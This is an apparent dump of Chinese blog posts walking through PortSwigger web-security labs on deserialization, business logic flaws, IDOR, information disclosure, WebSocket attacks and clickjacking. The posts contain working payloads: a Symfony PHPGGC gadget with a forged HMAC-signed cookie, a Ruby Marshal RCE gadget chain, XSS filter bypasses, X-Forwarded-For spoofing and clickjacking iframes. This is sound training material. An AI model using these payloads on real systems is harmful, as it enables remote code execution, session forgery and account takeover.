解码，url的方式，发现了可控的参数\n\n\n进入靶场，我们先输入接口 /cgi-bin/phpinfo.php，这个接口表明了 PHP 的信息。并获取到了一个 Secret_KEY。\n\n\n接着我们抓包，并修改 Cookie 使其报错。我们探测出 PHP Symfon Version 为 4.3.6.\n\n\n接着，我们切换到 PHPGGC 这一工具下，使用命令探测 PHPGGC 构造 Payload 的版本。\n./phpggc -i symfony/rce4\n\n\n通过命令构造 Payload\n\n./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64\n\n现在我们需要构造一个 Cookie，Cookie 的构造需要我们的 Base64 编码加上一个 Secret_Key，算法如下；这里生成的 Base64 编码需要把换行全部去掉。\n&lt;?php\n$object = \"PHPGGC中生成的base64字符串\";\n$secretKey = \"yprtgexgp1wu7vwejr6s1khql8g9wv7r\";\n$cookie = urlencode('&#123;\"token\":\"' . $object . '\",\"sig_hmac_sha1\":\"' . hash_hmac('sha1', $object, $secretKey) . '\"&#125;');\necho $cookie;\n\n生成的码：\n%7B%22token%22%3A%22Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg%3D%3D%22%2C%22sig_hmac_sha1%22%3A%22917bd6977b88bb1b1580dd46345c125219d284d0%22%7D\n\n用此替换 Cookie，发包即可。不用将 sig_hmac_sha1 替换掉。\n(3) 使用 ruby-deserialization 构造 payload\n针对 Ruby 进行反序列化 payload 的制作。\n\nRUBY 2.X 通用 RCE 反序列化小工具链\nhttps://www.elttam.com/blog/ruby-deserialization/#content\n先安装 Ruby 环境，为 EXP 做准备；这里我是用 Debian10 的。安装比较简单\nsudo apt-get install ruby-full\n\n // 安装完毕后输入，检测输入\n ruby -v \n\n\nRuby 用来攻击的 Payload\n#!/usr/bin/env ruby  \n​  \nclass Gem::StubSpecification  \ndef initialize; end  \nend  \n​  \n​  \nstub_specification = Gem::StubSpecification.new  \nstub_specification.instance_variable_set(:@loaded_from, \"|id 1>&amp;2\")  \n​  \nputs \"STEP n\"  \nstub_specification.name rescue nil  \nputs  \n​  \n​  \nclass Gem::Source::SpecificFile  \ndef initialize; end  \nend  \n​  \nspecific_file = Gem::Source::SpecificFile.new  \nspecific_file.instance_variable_set(:@spec, stub_specification)  \n​  \nother_specific_file = Gem::Source::SpecificFile.new  \n​  \nputs \"STEP n-1\"  \nspecific_file &lt;=> other_specific_file rescue nil  \nputs  \n​  \n​  \n$dependency_list= Gem::DependencyList.new  \n$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])  \n​  \nputs \"STEP n-2\"  \n$dependency_list.each&#123;&#125; rescue nil  \nputs  \n​  \n​  \nclass Gem::Requirement  \ndef marshal_dump  \n[$dependency_list]  \nend  \nend  \n​  \npayload = Marshal.dump(Gem::Requirement.new)  \n​  \nputs \"STEP n-3\"  \nMarshal.load(payload) rescue nil  \nputs  \n​  \n​  \nputs \"VALIDATION (in fresh ruby process):\"  \nIO.popen(\"ruby -e 'Marshal.load(STDIN.read) rescue nil'\", \"r+\") do |pipe|  \npipe.print payload  \npipe.close_write  \nputs pipe.gets  \nputs  \nend  \n​  \nputs \"Payload (hex):\"  \nputs payload.unpack('H*')[0]  \nputs  \n​  \n​  \nrequire \"base64\"  \nputs \"Payload (Base64 encoded):\"  \nputs Base64.encode64(payload)\n\n\n在此处修改我们需要构造的 Payload 进行攻击。\n\n\n\n\n\nLab: Exploiting Ruby deserialization using a documented gadget chain\n接着，我们将 Ruby 中的那段程序用 rm /home/carlos/morale.txt 进行替换，再运行程序。\n\n\n抓包，将这段 base64 的编码进行 url 编码；将其替换 cookie。\n\n还有一部分的代码审计打算学完代码审计再来看，要不然感觉没什么意义。\n\n0x04 反序列化的防御\n一般来说，避免用户输入的数据反序列化。\n确保反序列化的输入不被用户可控。\n常对框架打补丁\n\n","categories":["Port"],"tags":["web安全"]},{"title":"PortSwigger-业务逻辑漏洞_2","url":"/2021/09/02/PortSwigger-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-2/","content":"Port 业务逻辑漏洞-2\n\n3. 对用户行为做出有缺陷的假设开发人员没有考虑违反这些假设的潜在危险情景的广泛问题。\n3.1 受信任的用户改邮箱而没有经过验证，而邮箱能够获得权限。\n例如：本来的邮箱@123.com,管理员的邮箱@dontwanntcry.com\n修改邮箱为@dontwanntcry.com即可获得管理员权限\n\n\n3.2 用户不会总是提供强制性输入\n当在同一服务器侧脚本中执行多个功能时，\n在这种情况下，特定参数的存在或不存在可能会决定执行哪些代码。\n删除参数值可能允许攻击者访问本应无法访问的代码路径。\n\n在构造payload前\n\n一次仅删除一个参数，以确保达到所有相关代码路径。\n\n尝试删除参数的名称以及值。服务器通常会以不同的方式处理这两种情况。\n\n遵循多阶段流程直至完成。有时，在一个步骤中篡改参数会对工作流程中的另一步产生进一步的影响。\n这适用于URL和参数，同样需要检查Cookie。\n\n\n如图\n\n\n删除current password参数来达到绕过的目的。\n\n还可以通过修改token与victim\n3.3 不遵循预期序列许多交易依赖于预先定义的工作流程，包括一系列步骤。\nWeb界面通常会引导用户完成此过程，每次完成当前工作流时，都会将他们带到工作流程的下一步。\n但是，攻击者不一定遵守此预期序列。\n3.3A 工作流程的验证不足\nGET请求确认工作状态之后，可以绕过前面流程，直接达到状态\n\n\n\n\n先需要发现成功绕过的GET请求参数\n\n\n\n将url修改为前面能够绕过的流程，直接解决。\n3.3B 绕过有缺陷的事件序列如图所示，在进行登录之后，要对role进行选择\n\n\n而这一选择中，存在绕过的可能性，使用Burp Repeaterdrop之后进行绕过即可\n\n4. 域特定缺陷网上商店的折扣功能是域特定缺陷的经典攻击面\n  例如，考虑一家在线商店，该商店对超过 1000 美元的订单提供 10% 的折扣。如果业务逻辑无法检查在应用折扣后订单是否更改，则这可能会受到滥用。\n4.1 业务执行不规律\n最常见的是优惠券的漏洞，在提交一次优惠券的代码之后，重复提交则会报错\n但将两个优惠券交替输入，成功绕过\n\n\n\n\n\n4.2 绕过加密手段","categories":["Port"],"tags":["web安全"]},{"title":"PortSwigger-不安全的直接对象引用(IDOR)","url":"/2021/09/23/PortSwigger-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E7%9B%B4%E6%8E%A5%E5%AF%B9%E8%B1%A1%E5%BC%95%E7%94%A8-IDOR/","content":"IDOR\n\n\n0x01直接参照数据库对象的IDOR漏洞考虑使用以下 URL 访问客户帐户页面的网站，从后端数据库检索信息：\nhttps:&#x2F;&#x2F;insecure-website.com&#x2F;customer_account?customer_number&#x3D;132355\n\n在此处，客户编号直接用作后端数据库上执行的查询中的记录索引。如果没有其他控制，攻击者只需修改值，绕过访问控制即可查看其他客户的记录。这是IDOR漏洞导致横向特权升级的示例。customer_number\n攻击者可以通过在绕过访问控制的同时将用户更改为具有额外特权的用户来执行水平和纵向特权升级。\nhttps:&#x2F;&#x2F;insecure-website.com&#x2F;customer_account?customer&#x3D;administrator\n\n0x02直接参照静态文件的 IDOR 漏洞当敏感资源位于服务器端文件系统上的静态文件中时，通常会出现IDOR漏洞。\n例如，网站可能会使用增量文件名将聊天消息记录保存到磁盘中，并允许用户通过访问URL来检索这些记录，如下所示：\nhttps:&#x2F;&#x2F;insecure-website.com&#x2F;static&#x2F;12144.txt\n\n在这种情况下，攻击者只需修改文件名即可检索其他用户创建的脚本，并可能获取用户凭据和其他敏感数据。\n","categories":["Port"],"tags":["web安全"]},{"title":"PortSwigger-业务逻辑漏洞_1","url":"/2021/09/02/PortSwigger-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E_1/","content":"Port 业务逻辑漏洞\n\n业务逻辑漏洞的产生  由于设计和开发团队对用户如何与应用程序进行交互做出有缺陷的假设，因此经常会出现业务逻辑漏洞。这些错误的假设可能导致用户输入验证不足。\n  归根结底，这意味着当攻击者偏离预期的用户行为时，应用程序未能采取适当步骤来防止这种情况，并且随后未能安全地处理情况。\n业务逻辑漏洞实例1. 对客户端过度信任\n一般出现于用户只能通过提供的Web界面与应用程序进行交互。\n\n\n攻击手段: 使用Burp Repeater攻击\n\n\n\n修改price参数为1即可。\n2. 未能处理非常规输入\n非常规输入：例如负值。\n通过负值，将-1000的包发送到受害者银行卡，\n这可能会导致攻击者从受害者那里收到1000美元。\n\n\n审核应用程序时，您应该使用 Burp 代理和中继器等工具尝试提交非常规值。特别是，尝试合法用户不太可能输入的范围中的输入。这包括基于文本字段的异常高或超低的数字输入和异常长的字符串。您甚至可以尝试意外数据类型。通过观察应用程序的响应，您应该尝试回答以下问题：\n\n数据是否受到任何限制？\n\n当你达到这些极限时会发生什么？\n\n您的输入是否执行任何转换或规范化？\n\n\n\n2.1 负数漏洞\n\n通过修改参数使钱包获得钱\n\n\n最终的购买界面\n\n2.2 数据过大漏洞先判断一次性能够添加多少数据\n\n\n发现报错，更改数据\n\n\n\n在成功之后使用Burp Intruder模块\n\n\n\n\n在爆破到出现临界点的时候，发现数由最大数变为了，最大数的负数，\n再接着一步步变小\n\n\n\n\n那么说明Web网页中，此界面存在业务逻辑漏洞\n接着，我们将此产品Remove\n再获取另一商品，进行设置后进行图上的操作\n\n\n\n\n\n同样\n在爆破到出现临界点的时候，发现数由最大数变为了，最大数的负数\n再接着一步步变小\n\n\n当价格变为某个比较小的负数时，添加新的产品，使得商品价格变为正数\n\n最后的结果\n\n\n2.3 不一致输入的异常\n需要得到管理员权限，可以通过注册界面来提权。\n\n\n先使用burpsuite discover content模块对目录进行扫描与遍历\n\n\n\n\n这里出现一个邮箱截断问题\n也就是输入过长的邮箱，会导致截断\n\n截断之后会只剩下255个字符。\n\n\n我们通过截断的原理，得到以@dontwannacry.com为后缀的邮箱地址\n\n\n从而能够得到管理员的权限，也就是进行提权\n","categories":["Port"],"tags":["web安全"]},{"title":"PortSwigger-信息泄露","url":"/2021/09/15/PortSwigger-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/","content":"Port 信息泄露\n\n0x01 信息泄露漏洞的探测数据的泄露是多方面的，要对敏感数据进行多方面的探测。\n\n主要有以下四种方法\n\n1. fuzz字典爆破使用Burp Intruder进行爆破\n\n将payload添加到参数中，并使用预先构建的fuzz字典来测试大量不同的输入。\n通过比较HTTP状态代码、响应时间、长度等，轻松识别响应中的差异。\n使用grep匹配规则快速识别关键字的发生，例如，”，”等”。\n应用grep提取规则来提取和比较响应中引人注目的内容。\n\n2. 工程信息响应\n类似于SQL语句的报错注入\n\n  例如，提交无效参数值可能导致详细信息的堆栈跟踪或调试响应。\n  有时，可能会导致错误消息在响应中披露所需数据的价值。\n0x02 信息泄露的常见来源1. 爬虫文件:robots.txt\n简单的查看/robots.txt与/robots.txt/sitemap.xml\n\n2. 目录爆破\n通过御剑或者其他工具爆破目录。\n\n3. 开发人员注释与评论在开发过程中，有时会在标记中添加在线HTML注释与评论。这些评论通常在部署到生产环境中之前被删除。\n但是，评论有时可能会因为某人没有充分意识到安全影响而故意遗忘、遗漏甚至留下。虽然这些评论在渲染的页面上是看不到的，但可以使用Burp甚至浏览器的内置开发人员工具轻松访问这些评论。\n4. 通过报错得到的信息泄露\n 例如SQL注入、用户名与密码爆破等。\n\n\n举个例子：通过报错消息得到某网站使用的是易受攻击的第三方框架，\n 需要获取第三方框架的版本号。\n\n\npayload: 修改提交的参数\n\n\n将这里的&#x2F;product?productId&#x3D;1参数修改为字符型\n通过堆栈跟踪的报错成功得到版本号——-&gt;\n\n\n什么是堆栈跟踪?简单来说也就是报错的位置,有时候你在运行程序时可能会出现如下错误：\nException in thread &quot;main&quot; java.lang.NullPointerException\n        at com.example.myproject.Book.getTitle(Book.java:16)\n        at com.example.myproject.Author.getBookTitles(Author.java:25)\n        at com.example.myproject.Bootstrap.main(Bootstrap.java:14)\n\n人们常把这个定义为“堆栈追踪(Stack Trace)”.\n换句话说，StackTrace就是当程序运行且抛出异常时一系列的函数调用的轨迹。\n\n5. 在调试界面上的信息披露出于调试，许多网站会生成自定义错误消息和日志，包含大量有关应用程序行为的信息。\n虽然此信息在开发过程中很有用，但如果在生产环境中泄露，对攻击者也非常有用。\n调试消息有时可能包含用于开发攻击的重要信息，包括：\n\n可通过用户输入操作的关键会话变量的值\n\n后端组件的主机名和凭据\n\n服务器上的文件和目录名称\n\n用于加密通过客户端传输的数据的密钥\n调试信息有时可能会记录在单独的文件中。如果攻击者能够访问此文件，它可以作为了解应用程序运行状态的有用参考。它还可以提供几个线索，说明他们如何提供精心制作的输入来操纵应用状态并控制收到的信息。\n\n\npayload：使用Burp的Find Comment来查找\n\n\n发现爆出的三个Comment\n\n\n发现了\n&#x2F;cgi-bin&#x2F;phpinfo.php\n\n登入后找到SECRET_KEY\n\n\n6. 用户账户界面  就其本质而言，用户的个人资料或帐户页面通常包含敏感信息，如用户的电子邮件地址、电话号码、API 密钥等。\n由于用户通常只能访问自己的帐户页面，这本身并不表示漏洞。\n但是，某些网站包含逻辑缺陷，可能使攻击者利用这些页面查看其他用户的数据。\n7. 备份文件泄露源码\n如.bak文件\n\n如何确定某个网站存在备份文件访问&#x2F;robots.txt即可。\n8. 不安全的配置引起的信息泄露由于配置不当，网站有时容易受到攻击。\n由于广泛使用第三方技术，这种情况尤其普遍，实施第三方技术的人不一定理解其广泛的配置选项。\n例如，发现管理员登录需要本地的users  ↓\n察觉存在SSRF\n\n\n将GET请求的包抓包，并将HTTP请求改为TRACE\n发包后的结果，发现存在SSRF\n\n\n接着，就是攻击SSRF的手段，Proxy———&gt;Options——-&gt;Match and Replace\n修改如下\n\n\n9. git泄露\n原理：git clone下来的文件总是存在.git的附带文件。\n\n那么在web上，访问&#x2F;.git即可\n\n\n再使用kali机，进行wget命令\nwget -r +url\n\n\n\n这里还要预先下载git-cola\nsudo apt-get install git\nsudo apt-get install git-cola\n\n用git-cola打开文件，并Undo last commit\n\n\n\n\n\n如何预防信息泄露？\n确保参与制作网站的每个人都充分了解哪些信息被认为是敏感的。有时看似无害的信息对攻击者来说也很有用。\n审核任何代码，了解作为QA或构建流程一部分的潜在信息披露。自动化某些相关任务（如剥离开发人员评论）应该相对容易。\n尽可能多地使用通用错误消息。不要不必要地向攻击者提供有关应用行为的线索。\n仔细检查生产环境中是否禁用任何调试或诊断功能。\n确保完全了解任何第三方技术的配置设置和安全影响。花时间调查并禁用实际不需要的任何功能和设置。\n\n","categories":["Port"],"tags":["web安全"]},{"title":"PortSwigger-基于WebSocket的漏洞","url":"/2022/04/09/PortSwigger-%E5%9F%BA%E4%BA%8EWebSocket%E7%9A%84%E6%BC%8F%E6%B4%9E/","content":"\n本文首发于 FreeBuf https://www.freebuf.com/vuls/328279.html\n\n\nPortSwigger-基于 WebSocket 的漏洞0x01 什么是 WebSocketWebSocket\n简单地说，WebSocket 协议允许服务器可以主动向客户端推送信息，而传统的 HTTP 协议只能是客户端向服务器发出请求，服务器返回查询结果。\n\nWebSocket 建议于 TCP 协议之上，与 HTTP 协议有良好的兼容性。协议标识符是ws；如果加密，则为wss，服务器网址就是 URL\n\n看一段 WebSocket 的代码，比较通俗易懂，并不需要过多讲解\n\nvar ws = new WebSocket(\"vans.org\");\n\nws.onopen = function(evt) &#123; \n  console.log(\"Connection open ...\"); \n  ws.send(\"Hello WebSockets!\");\n&#125;;\n\nws.onmessage = function(evt) &#123;\n  console.log( \"Received Message: \" + evt.data);\n  ws.close();\n&#125;;\n\nws.onclose = function(evt) &#123;\n  console.log(\"Connection closed.\");\n&#125;;   \n\nWebSocket 与 HTTP形象理解一下 WebSocket 与 HTTP 在发送数据的问题，参考WebSocket原理\n\nWebSocket 允许服务器和用户互相发送消息HTTP 只允许用户发送请求给服务器HTTP 小场景，模拟 ajax 轮询客户端：啦啦啦，有没有新信息(Request)服务端：没有（Response）客户端：啦啦啦，有没有新信息(Request)服务端：没有。。（Response）客户端：啦啦啦，有没有新信息(Request)服务端：你好烦啊，没有啊。。（Response）-loopWebSocket 小场景客户端：啦啦啦，有没有新信息，没有的话就等有了才返回给我吧（Request）服务端：额。。 等待到有消息的时候。。来 给你（Response）客户端：啦啦啦，有没有新信息，没有的话就等有了才返回给我吧（Request） -loop\n\n前文说到 WebSocket 是一种协议，且与 HTTP 兼容性很好，于是我们抓一个 WebSocket 的包观察一下；在 Burpsuite 当中存在一个专门为 WebSocket 服务的界面叫 “WebSockets History”\n\n\n\n\n这边再放个 HTTP 的包对比一下\n\n\n很明显的看到 WebSocket 的 Response 非常不一样\n0x02 基于 WebSocket 的漏洞详解\n在讲靶场与知识点之前，我们先介绍一下应用 WebSocket 最多的场景 —————— Live Chat，或者是一些直播\n对于 Live Chat 这一场景来说，是需要用户与服务器的交互，服务器也与用户交互。\n\n\n在 Burpsuite 当中，有一个专门的 WebSockets History，在这里我们可以看到 WebSocket 的记录\n\n1. 尝试修改 WebSocket 的发送内容，造成 XSS 攻击\nLab: Manipulating WebSocket messages to exploit vulnerabilities\n点开靶场，我们移步到 Live Chat 的界面\n\n\n先抓包，接着发送一条数据，并在 WebSockets History 中查看数据，修改包，构造成 XSS 的 POC。\n&lt;img src=1 onerror='alert(1)'>\n\n\n\n发包，再回到 Web 界面的时候成功实现 XSS\n\n\n2. 操纵 WebSocket 的握手过程利用漏洞\nWebSocket 的握手过程：\n\nWebSocket 的 Request 包在发送过程中，比 HTTP 包多了几个数据\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw&#x3D;&#x3D;\nSec-WebSocket-Protocol: chat, superchat\nSec-WebSocket-Version: 13\n这个就是Websocket的核心了，告诉Apache、Nginx等服务器：**注意啦，窝发起的是Websocket协议，快点帮我找到对应的助理处理~不是那个老土的HTTP。\nSec-WebSocket-Key 是一个Base64 encode的值，这个是浏览器随机生成的，负责验证。\nSec_WebSocket-Protocol 是一个用户定义的字符串，用来区分同URL下，不同的服务所需要的协议。\nSec-WebSocket-Version 是告诉服务器所使用的Websocket Draft（协议版本）\n\n上述就是 WebSocket 的握手全过程，操纵 WebSocket 的握手过程一般有一下三种攻击方法，这些方法是用来辅助攻击的，而不是攻击的主题。\n\n1.由于服务器过于信任用户的输入，在 HTTP Header 中伪造 X-Forwarded-For，绕过一些安全策略。\n2.WebSocket 消息修改，也就是上面的一个靶场，因为处理 WebSocket 消息的会话上下文通常由握手消息的会话上下文确定。\n3.应用程序使用的自定义 HTTP Header 引入的攻击面。\n\n\nLab: Manipulating the WebSocket handshake to exploit vulnerabilities\n\n先交代清楚这道题目的防御措施，不然讲起靶场来，乱七八糟。\n\n这道靶场当中，服务器会过滤 WebSocket 消息中关于 XSS 的攻击，也就是说，当我们输入 &lt;img src=1 onerror=&#39;alert(1)&#39;&gt;时，会被过滤，而且我们的 IP 会被封禁，在短时间内无法再发起 WebSocket 连接。\n\n由此我们可以尝试伪造 XFF，让自己成为不被封禁的 “IP”\n\n靶场部分同样去到 Live Chat 界面发完消息后抓包，修改 message 信息，构造 XSS 攻击的 POC\n&lt;img src=1 onerror='alert(1)'>\n\n发出消息许久，无回显，很明显是被过滤了，而且再发消息也没有响应， IP 也被封禁。\n\n\n接着点 Reconnect，修改 XFF 之后发包，可以立马连接上。再尝试绕过方法，构造 POC\n&lt;img src=1 oNeRrOr=alert`1`>\n\n\n\n成功过关 ~\n0x03 基于 WebSocket 的 CSRFCSRF 相关的知识可以移步至我的博客CSRF攻击 | 芜风 下学习，这里简单提一提。\n1. 基于 WebSocket 的 CSRF 的定义\nCross-site WebSocket hijacking，也就是跨域 WebSocket 劫持攻击，是基于 WebSocket 的握手过程进行的 CSRF 攻击。\n造成这种攻击的根本原因在于 WebSocket 的握手只依赖于 HTTP Cookie 进行会话处理，而没有任何其他不可预测的值。例如 CSRF Token 或是其他的。\n\n2. 跨站点 WebSocket 劫持的危害(1) 越权也就是熟知的访问控制，垂直越权与水平越权。\n(2) 泄露数据因为 WebSocket 的通信是全双工通信的，所以用户与服务器之间交互的信息有可能被攻击者监听，这种监听是无声的监听，被攻击者不知道自己处于被监听状态。\n从而造成信息的泄露\n3. 实现跨站点的 WebSocket 劫持攻击\n前面说到，跨站点的 WebSocket 劫持攻击一般是因为 WebSocket 的握手消息，只由 HTTP Cookie 判断，并且在请求参数中不使用 CSRF Token 或其他随机值。\n\n就和之前的 CSRF 攻击差不多，我们直接看靶场\n\nLab: Cross-site WebSocket hijacking\n和之前一样，去到 Live Chat 界面，抓包发包\n\n\n毕竟是 CSRF 嘛，去到 Port 提供的第三方服务器，exploit server，并使用 Burp Collaborator。\n在 Exploit Server 中构造 payload\n\n\n再 Deliver to victim，在 Burp Collaborator 界面点击 Poll now\n\n\n\n去找到泄露的信息\n\n\n\n去到  MyAccout 下登录即可 ~\n0x04 基于 WebSocket 的一系列漏洞的防御措施\n1.使用 wss 协议（WebSockets over TLS）。\n2.对 WebSockets 端点的 URL 进行硬编码，此处要注意业务点，和用户的输入数据区分开，不要讲用户的输入数据也硬编码了。\n3.保护 WebSocket 握手消息免受 CSRF 的攻击，以避免跨站点 WebSockets 劫持漏洞。\n4.将通过 WebSocket 接收的数据视为在两个方向上都不受信任。在服务器端和客户端安全地处理数据，以防止基于输入的漏洞，如 SQL 注入和 CSRF\n\n","categories":["Port"],"tags":["web安全"]},{"title":"PortSwigger-点击劫持攻击","url":"/2022/01/31/PortSwigger-%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81%E6%94%BB%E5%87%BB/","content":"点击劫持攻击\n\n\n前记：写这篇文章首先是为大家介绍点击劫持攻击，其次，如果是刷port的小伙伴，我不建议特别刷port的这个靶场，它严格要求你必须将恶意iframe内容与原元素严格对齐，要强行将靶场题目解出意义甚微，建议还是找实践性的靶场比较好。\n\n0x01 什么是点击劫持攻击\n点击劫持：英文Clickjacking，也叫 UI redressing。\n\n点击劫持是一种基于界面的攻击，通过点击诱饵网站中的其他一些内容，诱骗用户点击隐藏网站上的可操作内容。\n\n点击劫持攻击：直接举例子说比较好，比如我们在某个网站浏览内容时，跳出来了一些广告，如图所示。\n\n\n\n当我们点击”点这里”的时候，出来的却是另外一个界面——————这就是臭名昭著的点击劫持攻击。\n0x02 点击劫持攻击的基本构造点击劫持攻击使用CSS来创建和操作图层。设置CSS中的iframe属性值，使得我们隐藏的劫持按钮与本身网页的功能性按钮重合或达到一个阈值。从而实现我们的点击劫持攻击。我们先来看Port这里提供给我们的基础payload：\n&lt;head>\n  &lt;style>\n    #target_website &#123;\n      position:relative;\n      width:128px;\n      height:128px;\n      opacity:0.00001;\n      z-index:2;\n      &#125;\n    #decoy_website &#123;\n      position:absolute;\n      width:300px;\n      height:400px;\n      z-index:1;\n      &#125;\n  &lt;/style>\n&lt;/head>\n...\n&lt;body>\n  &lt;div id=\"decoy_website\">\n  ...decoy web content here...\n  &lt;/div>\n  &lt;iframe id=\"target_website\" src=\"https://vulnerable-website.com\">\n  &lt;/iframe>\n&lt;/body>\n\nPort提供的payload当中，src是要攻击的url，width,height为实行恶意点击劫持攻击的元素的高度与宽度，opacity为透明度。这些数值需要根据攻击情况进行设计。\n先以port这里最基础的题目为例，来感受一下点击劫持：\n1. 如入无人之境的点击劫持攻击1.1 基础点击劫持配套靶场Lab: Basic clickjacking with CSRF token protection这里，我们登录进去，直接输入payload就可以了，要将url替换成自己的url\n&lt;style>\n   iframe &#123;\n       position:relative;\n       width:700px;\n       height: 500px;\n       opacity: 0.01;\n       z-index: 2;\n   &#125;\n   div &#123;\n       position:absolute;\n       top:380px;\n       left:60px;\n       z-index: 1;\n   &#125;\n&lt;/style>\n&lt;div>Click me&lt;/div>\n&lt;iframe src=\"$url\">&lt;/iframe>\n\n在这一例靶场当中，我们使用”Clike me”伪装”Delete email”成功，那如果我们需要伪装”Update email”该怎么办呢？\n1.2 交互性输入的点击劫持\n续接上文，我们这里需要用”Click me”伪装成”Update email”该怎么做呢？如果只是像2.1那样做的话，”Update email”需要参数才能被执行，似乎很难完成了。\n\n配套靶场Lab: Clickjacking with form input data prefilled from a URL parameterpayload：之前输入url的地方，现在加上GET请求的参数\n&lt;style>\n   iframe &#123;\n       position:relative;\n       width:700px;\n       height: 500px;\n       opacity: 0.1;\n       z-index: 2;\n   &#125;\n   div &#123;\n       position:absolute;\n       top:430px;\n       left:60px;\n       z-index: 1;\n   &#125;\n&lt;/style>\n&lt;div>Click me&lt;/div>\n&lt;iframe src=\"url?email=123@123.com\">&lt;/iframe>\n\n\n\n1.3 点击劫持攻击中执行DOM型XSS原先我们看到的网站，其实都是对网页上原本存在的元素进行利用，而业务方面很有可能出现问题的则是DOM型XSS。\n配套靶场：Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS直接看payload吧，比较好理解\n&lt;style>\n   iframe &#123;\n       position:relative;\n       width:700px;\n       height: 500px;\n       opacity: 0.0001;\n       z-index: 2;\n   &#125;\n   div &#123;\n       position:absolute;\n       top:690px;\n       left:80px;\n       z-index: 1;\n   &#125;\n&lt;/style>\n&lt;div>Click me&lt;/div>\n&lt;iframe\nsrc=\"url?name=123&lt;img src=1 onerror=print()>&amp;email=hacker@attacker-website.com&amp;subject=test&amp;message=test#feedbackResult\">&lt;/iframe>\n\nframe当中的内容格式可以先通过burpsuite抓包，随后自己编写\n\n\n\n当时做这道题目的时候payload卡了很久很久，建议大家如果尝试不出payload可以直接跳过。\n\n1.4 多步骤&#x2F;操作的点击劫持攻击攻击者操纵目标网站的输入可能需要执行多项操作。例如，攻击者可能想要诱使用户从零售网站购买商品，因此需要在下订单之前将商品添加到购物篮中。攻击者可以使用多个分区或iframe实现这些操作。从攻击者的角度来看，这种攻击需要相当精确和谨慎，才能有效和隐蔽。\n配套靶场 Lab: Multistep clickjackingpayload\n&lt;style>\n   iframe &#123;\n       position:relative;\n       width:500px;\n       height: 700px;\n       opacity: 0.1;\n       z-index: 2;\n   &#125;\n   .firstClick, .secondClick &#123;\n       position:absolute;\n       top:330px;\n       left:50px;\n       z-index: 1;\n   &#125;\n   .secondClick &#123;\n       top:285px;\n       left:225px;\n   &#125;\n&lt;/style>\n&lt;div class=\"firstClick\">Click me first&lt;/div>\n&lt;div class=\"secondClick\">Click Store&lt;/div>\n&lt;iframe src=\"url\">&lt;/iframe>\n\n\n\n2. 存在一定防御能力的点击劫持攻击A:Frame busting代码的防御前文我们说到，可以直接通过iframe的覆盖&#x2F;劫持行为，对网页进行点击劫持的攻击。那同样，对于服务器来说，也有对应的防守手段————————frame busting或frame breaking scripts。一开始在看Port这部分的时候感觉挺难懂的，尤其又是看机翻的文章，不太好懂，这里我给大家详细地解释一下。\n\nframe busting与frame breaking scripts的作用\n\n检查并强制当前应用程序窗口是否为主窗口或顶部窗口，\n\n使所有帧可见，\n\n防止点击不可见的框架，\n\n拦截并向用户标记潜在的点击劫持攻击。\n\n\n\n\n\n浅原理：使用JavaScript脚本阻止恶意网站载入网页。如果检测到网页被非法网页载入，就执行自动跳转功能。Frame Busting代码是一种有效防御网站被攻击者恶意载入的方法，网站开发人员使用Frame Busting代码阻止页面被非法载入。\n\n知晓了frame busting代码的作用之后，那学安全嘛，总归是攻防，对方有了防御手段，我们也有绕过手段。\n2.1 通过设置sandbox来绕过frame busting代码\nsandbox是&lt;iframe&gt;标签当中的一个属性，具体有以下这些值\n\n\n\n\n值\n描述\n\n\n\n“”\n启用所有限制条件\n\n\nallow-same-origin\n允许将内容作为普通来源对待。如果未使用该关键字，嵌入的内容将被视为一个独立的源。\n\n\nallow-top-navigation\n嵌入的页面的上下文可以导航（加载）内容到顶级的浏览上下文环境（browsing context）。如果未使用该关键字，这个操作将不可用。\n\n\nallow-forms\n允许表单提交。\n\n\nallow-scripts\n允许脚本执行。\n\n\n对frame busting的绕过主要用到后面两个，硬生生理解原理比较累，我们来看一道靶场加强理解。\n配套靶场Lab: Clickjacking with a frame buster script\n先尝试按照原本的payload进攻攻击，观察一下有什么不一样\n\n\n\n这里的报错就是被frame busting给拦截的。结合上文所用的sandbox属性，我们构造出新的有效的payload：这里一定要将”Click me”和”update email”对齐，不然Lab会一直unsovled\n&lt;style>\n   iframe &#123;\n       position:relative;\n       width:700px;\n       height: 500px;\n       opacity: 0.1;\n       z-index: 2;\n   &#125;\n   div &#123;\n       position:absolute;\n       top:450px;\n       left:80px;\n       z-index: 1;\n   &#125;\n&lt;/style>\n&lt;div>Click me&lt;/div>\n&lt;iframe 